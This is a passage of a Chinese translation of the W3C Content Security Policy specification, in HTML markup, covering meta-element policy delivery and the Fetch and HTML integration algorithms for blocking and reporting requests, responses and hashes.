            <p>服务器可以为同一资源的不同<a data-link-type="dfn" data-refhint-key="b1744823"
                    href="https://tools.ietf.org/html/rfc9110#section-3.2" id="ref-for-section-3.2②">表示形式</a>发送不同的
                <code>Content-Security-Policy-Report-Only</code> 标头字段值。
            </p>
            <p>当用户代理收到 <code>Content-Security-Policy-Report-Only</code> 标头字段时，它必须按照 <a href="#fetch-integration">§ 4.1 与
                    Fetch 集成</a>和 <a href="#html-integration">§ 4.2 与 HTML 集成</a>中的描述，<a data-link-type="abstract-op"
                    href="#abstract-opdef-parse-a-serialized-csp"
                    id="ref-for-abstract-opdef-parse-a-serialized-csp③">解析</a>并<a data-link-type="dfn" href="#monitored"
                    id="ref-for-monitored">监控</a>其中包含的每个<a data-link-type="dfn" href="#serialized-csp"
                    id="ref-for-serialized-csp④">序列化 CSP</a>。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span> <a data-link-type="http-header"
                    href="#header-content-security-policy-report-only"
                    id="ref-for-header-content-security-policy-report-only①"><code>Content-Security-Policy-Report-Only</code></a>
                头字段<strong>不</strong>支持在
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta①">meta</a></code>
                元素中。
            </p>

            <h3 class="heading settled" data-level="3.3" id="meta-element"><span class="secno">3.3. </span><span
                    class="content">&lt;meta> 元素</span><a class="self-link" href="#meta-element"></a></h3>
            <p><code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document③">文档</a></code>可以通过一个或多个
                HTML
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta②">meta</a></code>
                元素传递策略，其
                <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv" id="ref-for-attr-meta-http-equiv①">http-equiv</a></code>
                属性为与字符串 "<code>Content-Security-Policy</code>" 不区分大小写的匹配。例如：
            </p>
            <div class="example" id="example-5b9d2837">
                <a class="self-link" href="#example-5b9d2837"></a>
                <pre class="highlight"><c- p>&lt;</c-><c- f>meta</c-> <c- e>http-equiv</c-><c- o>=</c-><c- s>"Content-Security-Policy"</c-> <c- e>content</c-><c- o>=</c-><c- s>"script-src 'self'"</c-><c- p>></c->
                </pre>
            </div>
            <p>实现细节可见 HTML 的 <a data-link-type="dfn"
                    href="https://html.spec.whatwg.org/#attr-meta-http-equiv-content-security-policy"
                    id="ref-for-attr-meta-http-equiv-content-security-policy">内容安全策略状态</a> <code>http-equiv</code> 处理说明
                <a data-link-type="biblio" href="#biblio-html" title="HTML 标准">[HTML]</a>。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span> <a data-link-type="http-header"
                    href="#header-content-security-policy-report-only"
                    id="ref-for-header-content-security-policy-report-only②"><code>Content-Security-Policy-Report-Only</code></a>
                头字段不支持在
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta③">meta</a></code>
                元素中。同样，<code>report-uri</code>、<code>frame-ancestors</code> 和 <code>sandbox</code> 指令也不支持。
            </p>
            <p>强烈建议作者尽量将
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta④">meta</a></code>
                元素尽早放在文档中，因为
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta⑤">meta</a></code>
                元素中的策略不适用于在其之前的内容。特别要注意，使用 <code>Link</code> HTTP 响应头字段预取的资源以及通过
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-link-element" id="ref-for-the-link-element">link</a></code>
                和
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script②">script</a></code>
                元素预取的资源不会被
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta⑥">meta</a></code>
                传递的策略阻止。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span>通过
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta⑦">meta</a></code>
                元素指定的策略将与保护资源的任何其他活动策略一同执行，无论它们在哪里指定。执行多个策略的一般影响在 <a href="#multiple-policies">§ 8.1 多个策略的影响</a> 中进行了描述。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span>
                <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-content" id="ref-for-attr-meta-content">content</a></code>
                属性的修改将在
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta⑧">meta</a></code>
                元素被解析后忽略。
            </p>
        </section>
        <section>
            <h2 class="heading settled" data-level="4" id="integrations"><span class="secno">4. </span><span
                    class="content">集成</span><a class="self-link" href="#integrations"></a></h2>
            <p><em>本节为非规范性内容。</em></p>
            <p>本文档定义了一组用于在其他规范中实现功能的算法。这些集成在这里概述以便于理解，但这些外部文档才是应当查阅的规范参考，以获取详细信息。</p>

            <h3 class="heading settled" data-level="4.1" id="fetch-integration"><span class="secno">4.1. </span><span
                    class="content"> 与 Fetch 的集成 </span><a class="self-link" href="#fetch-integration"></a></h3>
            <p>许多<a data-link-type="dfn" href="#directives" id="ref-for-directives⑦">指令</a>以某种方式控制资源加载。本规范提供了允许 Fetch
                决定某个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request⑤">请求</a>是否应被阻止或允许的算法，以及关于某个 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response③">响应</a>是否应被替换为
                <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-network-error"
                    id="ref-for-concept-network-error">网络错误</a>的决策。
            </p>

            <ol>
                <li data-md>
                    <p><a href="#should-block-request" id="ref-for-should-block-request①">§ 4.1.2 内容安全策略是否应阻止请求？</a> 是在
                        <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-main-fetch"
                            id="ref-for-concept-main-fetch">主 Fetch</a> 算法的步骤 2.4 中调用的。这允许指令的 <a data-link-type="dfn"
                            href="#directive-pre-request-check" id="ref-for-directive-pre-request-check">请求前检查</a>
                        对每个请求在进入网络之前执行，也对请求在到达资源的过程中可能经过的每次重定向进行检查。
                    </p>
                <li data-md>
                    <p><a href="#should-block-response" id="ref-for-should-block-response①">§ 4.1.3
                            内容安全策略是否应阻止请求的响应？</a> 是在 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-main-fetch" id="ref-for-concept-main-fetch①">主
                            Fetch</a> 算法的步骤 11 中调用的。这允许指令的 <a data-link-type="dfn" href="#directive-post-request-check"
                            id="ref-for-directive-post-request-check">请求后检查</a> 对来自网络或服务工作者的响应执行。</p>
            </ol>
            <h4 class="heading settled dfn-paneled algorithm" data-algorithm="报告请求的内容安全策略违规" data-dfn-type="dfn"
                data-export data-level="4.1.1" data-lt="报告请求的内容安全策略违规" id="report-for-request"><span
                    class="secno">4.1.1. </span><span class="content">报告 <var>request</var> 的内容安全策略违规</span><a
                    class="self-link" href="#report-for-request" id="ref-for-report-for-request"></a></h4>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request⑧">request</a> <var>request</var>，该算法基于 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-request-policy-container"
                    id="ref-for-concept-request-policy-container">策略容器</a> 的 <a data-link-type="dfn"
                    href="https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list"
                    id="ref-for-policy-container-csp-list">CSP 列表</a> 中“仅报告”的策略来报告违规行为。</p>
            <ol>
                <li data-md>
                    <p>令 <var>CSP list</var> 为 <var>request</var> 的 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-policy-container"
                            id="ref-for-concept-request-policy-container①">策略容器</a> 的 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list"
                            id="ref-for-policy-container-csp-list①">CSP 列表</a>。</p>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate④">对每个</a> <var>policy</var> 取自 <var>CSP list</var>：</p>
                    <ol>
                        <li data-md>
                            <p>如果 <var>policy</var> 的 <a data-link-type="dfn" href="#policy-disposition"
                                    id="ref-for-policy-disposition⑤">处置</a> 为 "<code>enforce</code>"，则跳到下一个
                                <var>policy</var>。
                            </p>
                        <li data-md>
                            <p>令 <var>violates</var> 为执行 <a href="#does-request-violate-policy">§ 6.7.2.1 请求是否违反策略？</a>
                                对 <var>request</var> 和 <var>policy</var> 的结果。</p>
                        <li data-md>
                            <p>如果 <var>violates</var> 不是 "<code>不违反</code>"，则执行 <a href="#report-violation">§ 5.5
                                    报告违规</a>，参数为执行 <a href="#create-violation-for-request">§ 2.4.2 为请求和策略创建违规对象</a>
                                的结果，对 <var>request</var> 和 <var>policy</var>。</p>
                    </ol>
            </ol>

            <h4 class="heading settled dfn-paneled algorithm" data-algorithm="请求是否应被内容安全策略阻止？" data-dfn-type="dfn"
                data-export data-level="4.1.2" data-lt="请求是否应被内容安全策略阻止？" id="should-block-request"><span
                    class="secno">4.1.2. </span><span class="content">请求 <var>request</var> 是否应被内容安全策略阻止？</span><a
                    class="self-link" href="#should-block-request" id="ref-for-should-block-request②"></a></h4>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request⑨">request</a> <var>request</var>，该算法返回 <code>Blocked</code> 或
                <code>Allowed</code>，并基于 <var>request</var> 的 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-request-policy-container"
                    id="ref-for-concept-request-policy-container②">策略容器</a> 的 <a data-link-type="dfn"
                    href="https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list"
                    id="ref-for-policy-container-csp-list②">CSP 列表</a> 来报告违规行为。
            </p>
            <ol>
                <li data-md>
                    <p>令 <var>CSP list</var> 为 <var>request</var> 的 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-policy-container"
                            id="ref-for-concept-request-policy-container③">策略容器</a> 的 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list"
                            id="ref-for-policy-container-csp-list③">CSP 列表</a>。</p>
                <li data-md>
                    <p>令 <var>result</var> 为 "<code>Allowed</code>"。</p>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate⑤">对每个</a> <var>policy</var> 取自 <var>CSP list</var>：</p>
                    <ol>
                        <li data-md>
                            <p>如果 <var>policy</var> 的 <a data-link-type="dfn" href="#policy-disposition"
                                    id="ref-for-policy-disposition⑥">处置</a> 为 "<code>report</code>"，则跳到下一个
                                <var>policy</var>。
                            </p>
                        <li data-md>
                            <p>令 <var>violates</var> 为执行 <a href="#does-request-violate-policy">§ 6.7.2.1 请求是否违反策略？</a>
                                对 <var>request</var> 和 <var>policy</var> 的结果。</p>
                        <li data-md>
                            <p>如果 <var>violates</var> 不是 "<code>不违反</code>"，则：</p>
                            <ol>
                                <li data-md>
                                    <p>执行 <a href="#report-violation">§ 5.5 报告违规</a>，参数为执行 <a
                                            href="#create-violation-for-request">§ 2.4.2 为请求和策略创建违规对象</a> 的结果，对
                                        <var>request</var> 和 <var>policy</var>。
                                    </p>
                                <li data-md>
                                    <p>将 <var>result</var> 设置为 "<code>Blocked</code>"。</p>
                            </ol>
                    </ol>
                <li data-md>
                    <p>返回 <var>result</var>。</p>
            </ol>
            <h4 class="heading settled dfn-paneled algorithm" data-algorithm="响应请求是否应被内容安全策略阻止？" data-dfn-type="dfn"
                data-export data-level="4.1.3" data-lt="响应请求是否应被内容安全策略阻止？" id="should-block-response">
                <span class="secno">4.1.3. </span><span class="content">响应 <var>response</var> 对 <var>request</var>
                    是否应被内容安全策略阻止？</span><a class="self-link" href="#should-block-response"
                    id="ref-for-should-block-response②"></a>
            </h4>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response"
                    id="ref-for-concept-response⑤">response</a> <var>response</var> 和一个 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①⓪">request</a>
                <var>request</var>，该算法返回 <code>Blocked</code> 或 <code>Allowed</code>，并基于 <var>request</var> 的 <a
                    data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-policy-container"
                    id="ref-for-concept-request-policy-container④">策略容器</a> 的 <a data-link-type="dfn"
                    href="https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list"
                    id="ref-for-policy-container-csp-list④">CSP 列表</a> 来报告违规行为。
            </p>
            <ol>
                <li data-md>
                    <p>令 <var>CSP list</var> 为 <var>request</var> 的 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-policy-container"
                            id="ref-for-concept-request-policy-container⑤">策略容器</a> 的 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list"
                            id="ref-for-policy-container-csp-list⑤">CSP 列表</a>。</p>
                <li data-md>
                    <p>令 <var>result</var> 为 "<code>Allowed</code>"。</p>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate⑥">对每个</a> <var>policy</var> 取自 <var>CSP list</var>：</p>
                    <ol>
                        <li data-md>
                            <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                                    id="ref-for-list-iterate⑦">对每个</a> <var>directive</var> 取自 <var>policy</var>：</p>
                            <ol>
                                <li data-md>
                                    <p>如果执行 <var>directive</var> 的 <a data-link-type="dfn"
                                            href="#directive-post-request-check"
                                            id="ref-for-directive-post-request-check①">请求后检查</a> 的结果为
                                        "<code>Blocked</code>"，则：</p>
                                    <ol>
                                        <li data-md>
                                            <p>执行 <a href="#report-violation">§ 5.5 报告违规</a>，参数为执行 <a
                                                    href="#create-violation-for-request">§ 2.4.2 为请求和策略创建违规对象</a> 的结果，对
                                                <var>request</var> 和 <var>policy</var>。
                                            </p>
                                        <li data-md>
                                            <p>如果 <var>policy</var> 的 <a data-link-type="dfn" href="#policy-disposition"
                                                    id="ref-for-policy-disposition⑦">处置</a> 为 "<code>enforce</code>"，则将
                                                <var>result</var> 设置为 "<code>Blocked</code>"。
                                            </p>
                                    </ol>
                            </ol>
                    </ol>
                    <p class="note" role="note"><span class="marker">注意：</span>检查的这一部分验证页面是否可以加载响应，即确保服务工作线程没有替换违反页面 CSP
                        的文件。</p>
                <li data-md>
                    <p>返回 <var>result</var>。</p>
            </ol>
            <h4 class="heading settled dfn-paneled algorithm" data-algorithm="Potentially report hash"
                data-dfn-type="dfn" data-export data-level="4.1.4" data-lt="Potentially report hash"
                id="potentially-report-hash"><span class="secno">4.1.4. </span><span class="content">可能报告哈希值</span><a
                    class="self-link" href="#potentially-report-hash" id="ref-for-potentially-report-hash"></a></h4>
            <p>给定一个<a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response"
                    id="ref-for-concept-response⑥">响应</a> <var>response</var>，一个<a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①①">请求</a>
                <var>request</var>，一个<a data-link-type="dfn" href="#directives" id="ref-for-directives⑧">指令</a>
                <var>directive</var> 和一个<a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object②②">内容安全策略对象</a> <var>policy</var>，
                执行以下步骤：
            </p>
            <ol>
                <li data-md>
                    <p>令 <var>algorithm</var> 为空<a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string"
                            id="ref-for-string⑥">字符串</a>。</p>
                </li>
                <li data-md>
                    <p>如果 <var>directive</var> 的<a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value④">值</a><a data-link-type="dfn"
                            href="https://infra.spec.whatwg.org/#list-contain" id="ref-for-list-contain①">包含</a>表达式 "<a
                            data-link-type="grammar" href="#grammardef-report-sha256"
                            id="ref-for-grammardef-report-sha256"><code>'report-sha256'</code></a>"，则将
                        <var>algorithm</var> 设置为 "sha256"。
                    </p>
                </li>
                <li data-md>
                    <p>如果 <var>directive</var> 的<a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value⑤">值</a><a data-link-type="dfn"
                            href="https://infra.spec.whatwg.org/#list-contain" id="ref-for-list-contain②">包含</a>表达式 "<a
                            data-link-type="grammar" href="#grammardef-report-sha384"
                            id="ref-for-grammardef-report-sha384"><code>'report-sha384'</code></a>"，则将
                        <var>algorithm</var> 设置为 "sha384"。
                    </p>
                </li>
                <li data-md>
                    <p>如果 <var>directive</var> 的<a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value⑥">值</a><a data-link-type="dfn"
                            href="https://infra.spec.whatwg.org/#list-contain" id="ref-for-list-contain③">包含</a>表达式 "<a
                            data-link-type="grammar" href="#grammardef-report-sha512"
                            id="ref-for-grammardef-report-sha512"><code>'report-sha512'</code></a>"，则将
                        <var>algorithm</var> 设置为 "sha512"。
                    </p>
                </li>
                <li data-md>
                    <p>如果 <var>algorithm</var> 为空<a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string"
                            id="ref-for-string⑦">字符串</a>，则返回。</p>
                </li>
                <li data-md>
                    <p>令 <var>hash</var> 为空<a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string"
                            id="ref-for-string⑧">字符串</a>。</p>
                </li>
                <li data-md>
                    <p>如果 <var>response</var> 是<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#cors-same-origin"
                            id="ref-for-cors-same-origin">CORS 同源</a>，则：</p>
                    <ol>
                        <li data-md>
                            <p>令 <var>h</var> 为在 <var>response</var> 的<a data-link-type="dfn"
                                    href="https://fetch.spec.whatwg.org/#concept-response-body"
                                    id="ref-for-concept-response-body">主体</a>和 <var>algorithm</var> 上<a
                                    data-link-type="dfn"
                                    href="https://w3c.github.io/webappsec-subresource-integrity#apply-algorithm-to-response"
                                    id="ref-for-apply-algorithm-to-response">将算法应用于字节</a>的结果。
                            </p>
                        </li>
                        <li data-md>
                            <p>令 <var>hash</var> 为 <var>algorithm</var>、U+2D (-) 和 <var>h</var> 的<a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#string-concatenate"
                                    id="ref-for-string-concatenate">串联</a>。</p>
                        </li>
                    </ol>
                </li>
                <li data-md>
                    <p>令 <var>global</var> 为 <var>request</var> 的<a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-client"
                            id="ref-for-concept-request-client①">客户端</a>的<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object"
                            id="ref-for-global-object④">全局对象</a>。</p>
                </li>
                <li data-md>
                    <p>如果 <var>global</var> 不是 <code
                            class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#window" id="ref-for-window①">Window</a></code>，
                        则返回。</p>
                </li>
                <li data-md>
                    <p>令 <var>stripped document URL</var> 为在 <var>global</var> 的<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window"
                            id="ref-for-concept-document-window①">文档</a>的<a data-link-type="dfn"
                            href="https://dom.spec.whatwg.org/#concept-document-url"
                            id="ref-for-concept-document-url">URL</a> 上执行<a href="#strip-url-for-use-in-reports">§ 5.4
                            为在报告中使用而剥离 URL</a>的结果。
                    </p>
                </li>
                <li data-md>
                    <p>如果 <var>policy</var> 的<a data-link-type="dfn" href="#policy-directive-set"
                            id="ref-for-policy-directive-set⑦">指令集</a>不包含名为 "report-to" 的<a data-link-type="dfn"
                            href="#directives" id="ref-for-directives⑨">指令</a>，则返回。</p>
                </li>
                <li data-md>
                    <p>令 <var>report-to directive</var> 为 <var>policy</var> 的<a data-link-type="dfn"
                            href="#policy-directive-set" id="ref-for-policy-directive-set⑧">指令集</a>中名为 "report-to" 的<a
                            data-link-type="dfn" href="#directives" id="ref-for-directives①⓪">指令</a>。</p>
                </li>
                <li data-md>
                    <p>令 <var>body</var> 为一个<a data-link-type="dfn" href="#csp-hash-report-body"
                            id="ref-for-csp-hash-report-body">csp 哈希报告主体</a>，其<a data-link-type="dfn"
                            href="#csp-hash-report-body-documenturl"
                            id="ref-for-csp-hash-report-body-documenturl">documentURL</a> 为 <var>stripped document
                            URL</var>，其<a data-link-type="dfn" href="#csp-hash-report-body-subresourceurl"
                            id="ref-for-csp-hash-report-body-subresourceurl">subresourceURL</a> 为 <var>request</var> 的
                        URL，其<a data-link-type="dfn" href="#csp-hash-report-body-hash"
                            id="ref-for-csp-hash-report-body-hash">hash</a> 为 <var>hash</var>，其<a data-link-type="dfn"
                            href="#csp-hash-report-body-destination"
                            id="ref-for-csp-hash-report-body-destination">destination</a> 为 <var>request</var> 的<a
                            data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-destination"
                            id="ref-for-concept-request-destination">目标</a>，其<a data-link-type="dfn"
                            href="#csp-hash-report-body-type" id="ref-for-csp-hash-report-body-type">type</a> 为
                        "subresource"。
                    </p>
                </li>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://www.w3.org/TR/reporting-1/#generate-and-queue-a-report"
                            id="ref-for-generate-and-queue-a-report">生成并排队报告</a>，使用以下参数：</p>
                    <dl>
                        <dt data-md><var>context</var>
                        </dt>
                        <dd data-md>
                            <p><var>settings object</var></p>
                        </dd>
                        <dt data-md><var>type</var>
                        </dt>
                        <dd data-md>
                            <p>"csp-hash"</p>
                        </dd>
                        <dt data-md><var>destination</var>
                        </dt>
                        <dd data-md>
                            <p><var>report-to directive</var> 的<a data-link-type="dfn" href="#directive-value"
                                    id="ref-for-directive-value⑦">值</a>。</p>
                        </dd>
                        <dt data-md><var>data</var>
                        </dt>
                        <dd data-md>
                            <p><var>body</var></p>
                        </dd>
                    </dl>
                </li>
            </ol>
            <h3 class="heading settled" data-level="4.2" id="html-integration"><span class="secno">4.2. </span><span
                    class="content">与 HTML 的集成</span><a class="self-link" href="#html-integration"></a></h3>
            <ol>
                <li data-md>
                    <p><a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsers.html#policy-container"
                            id="ref-for-policy-container">策略容器</a>有一个 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list"
                            id="ref-for-policy-container-csp-list⑥">CSP 列表</a>，其中包含对给定上下文有效的所有<a data-link-type="dfn"
                            href="#content-security-policy-object"
                            id="ref-for-content-security-policy-object②③">策略</a>对象。
                        除非另有说明，否则此列表为空，并通过<a data-link-type="abstract-op"
                            href="#abstract-opdef-parse-a-responses-content-security-policies"
                            id="ref-for-abstract-opdef-parse-a-responses-content-security-policies①">解析</a><a
                            data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response"
                            id="ref-for-concept-response⑧">响应</a>的
                        内容安全策略或根据<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsers.html#policy-container"
                            id="ref-for-policy-container①">策略容器</a>的规则继承来填充。</p>
                </li>
                <li data-md>
                    <p><a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object"
                            id="ref-for-global-object⑤">全局对象</a>的 <dfn class="dfn-paneled" data-dfn-for="global object"
                            data-dfn-type="dfn" data-noexport id="global-object-csp-list">CSP 列表</dfn>是使用<a
                            data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object"
                            id="ref-for-global-object⑥">全局对象</a>作为 <code>object</code> 执行<a href="#get-csp-of-object">§
                            4.2.2 检索对象的 CSP 列表</a>的结果。</p>
                </li>
                <li data-md>
                    <p>通过将<a data-link-type="dfn" href="#content-security-policy-object"
                            id="ref-for-content-security-policy-object②④">策略</a>插入<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object"
                            id="ref-for-global-object⑧">全局对象</a>的<a data-link-type="dfn" href="#global-object-csp-list"
                            id="ref-for-global-object-csp-list">CSP 列表</a>，可以为<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object"
                            id="ref-for-global-object⑦">全局对象</a><dfn class="dfn-paneled" data-dfn-type="dfn" data-export
                            id="enforced">强制执行</dfn>或<dfn class="dfn-paneled" data-dfn-type="dfn" data-export
                            id="monitored">监控</dfn>该策略。</p>
                </li>
                <li data-md>
                    <p>在<a data-link-type="dfn" href="https://html.spec.whatwg.org/#initialise-the-document-object"
                            id="ref-for-initialise-the-document-object">创建并初始化新的 <code>Document</code> 对象</a>算法期间调用<a
                            href="#run-document-csp-initialization" id="ref-for-run-document-csp-initialization①">§
                            4.2.1
                            运行文档的 CSP 初始化</a>。</p>
                </li>
                <li data-md>
                    <p>在<a data-link-type="dfn" href="https://html.spec.whatwg.org/#prepare-the-script-element"
                            id="ref-for-prepare-the-script-element">准备脚本元素</a>和<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/semantics.html#update-a-style-block"
                            id="ref-for-update-a-style-block">更新 <code>style</code> 块</a>算法期间调用<a
                            href="#should-block-inline" id="ref-for-should-block-inline①">§ 4.2.3
                            是否应通过内容安全策略阻止元素的内联类型行为？</a>，以确定是否允许执行/呈现内联脚本或样式块。</p>
                </li>
                <li data-md>
                    <p>在处理内联事件处理程序（如 <code>onclick</code>）和内联 <code>style</code> 属性期间调用<a href="#should-block-inline"
                            id="ref-for-should-block-inline②">§ 4.2.3 是否应通过内容安全策略阻止元素的内联类型行为？</a>，以确定是否应允许它们执行/呈现。</p>
                </li>
                <li data-md>
                    <p>在处理
                        <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta⑨">meta</a></code>
                        元素的
                        <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv" id="ref-for-attr-meta-http-equiv②">http-equiv</a></code>
                        期间<a data-link-type="dfn" href="#enforced" id="ref-for-enforced①">强制执行</a><a
                            data-link-type="dfn" href="#content-security-policy-object"
                            id="ref-for-content-security-policy-object②⑤">策略</a>。
                    </p>
                </li>
                <li data-md>
                    <p>HTML 使用负责资源加载的元素中的相关数据填充每个<a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request"
                            id="ref-for-concept-request①②">请求</a>的<a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-nonce-metadata"
                            id="ref-for-concept-request-nonce-metadata">加密随机数元数据</a>和<a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-parser-metadata"
                            id="ref-for-concept-request-parser-metadata">解析器元数据</a>。</p>
                    <p class="issue" id="issue-5599665e"><a class="self-link" href="#issue-5599665e"></a> 样式表加载尚未与
                        WHATWG HTML 中的 Fetch 集成。<a href="https://github.com/whatwg/html/issues/968">[whatwg/html 问题
                            #968]</a></p>
                </li>
                <li data-md>
                    <p>在
                        <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-base-element" id="ref-for-the-base-element">base</a></code>
                        元素的<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/semantics.html#set-the-frozen-base-url"
                            id="ref-for-set-the-frozen-base-url">设置冻结基本 URL</a>算法期间调用<a href="#allow-base-for-document"
                            id="ref-for-allow-base-for-document">§ 6.3.1.1 是否允许文档使用 base？</a>，以确保
                        <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/semantics.html#attr-base-href" id="ref-for-attr-base-href">href</a></code>
                        属性的值有效。
                    </p>
                </li>
                <li data-md>
                    <p>在<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsing-the-web.html#create-navigation-params-by-fetching"
                            id="ref-for-create-navigation-params-by-fetching">通过获取创建导航参数</a>算法期间调用<a
                            href="#should-block-navigation-request" id="ref-for-should-block-navigation-request②">§
                            4.2.4 是否应通过内容安全策略阻止类型的导航请求？</a>，并在<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsing-the-web.html#attempt-to-populate-the-history-entry&apos;s-document"
                            id="ref-for-attempt-to-populate-the-history-entry&apos;s-document">尝试填充历史记录条目的文档</a>算法期间调用<a
                            href="#should-block-navigation-response" id="ref-for-should-block-navigation-response①">§
                            4.2.5 是否应通过内容安全策略阻止目标中类型的导航请求的导航响应？</a>，以应用指令的导航检查以及对导航到 <code>javascript:</code> URL 的内联检查。
                    </p>
                </li>
                <li data-md>
                    <p>在<a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/workers.html#run-a-worker"
                            id="ref-for-run-a-worker">运行工作线程</a>算法期间调用<a href="#run-global-object-csp-initialization"
                            id="ref-for-run-global-object-csp-initialization①">§ 4.2.6 运行全局对象的 CSP 初始化</a>。</p>
                </li>
                <li data-md>
                    <p><a data-link-type="dfn" href="#sandbox" id="ref-for-sandbox">sandbox</a> 指令用于填充<a
                            data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsers.html#csp-derived-sandboxing-flags"
                            id="ref-for-csp-derived-sandboxing-flags">CSP 派生的沙盒标志</a>。</p>
                </li>
            </ol>
            <h4 class="heading settled dfn-paneled algorithm" data-algorithm="运行文档的 CSP 初始化" data-dfn-type="dfn"
                data-export data-level="4.2.1" data-lt="Run CSP initialization for a Document"
                id="run-document-csp-initialization">
                <span class="secno">4.2.1. </span><span class="content"> 运行 <code>CSP</code> 初始化用于 <code>Document</code>
                </span><a class="self-link" href="#run-document-csp-initialization"
                    id="ref-for-run-document-csp-initialization②"></a>
            </h4>
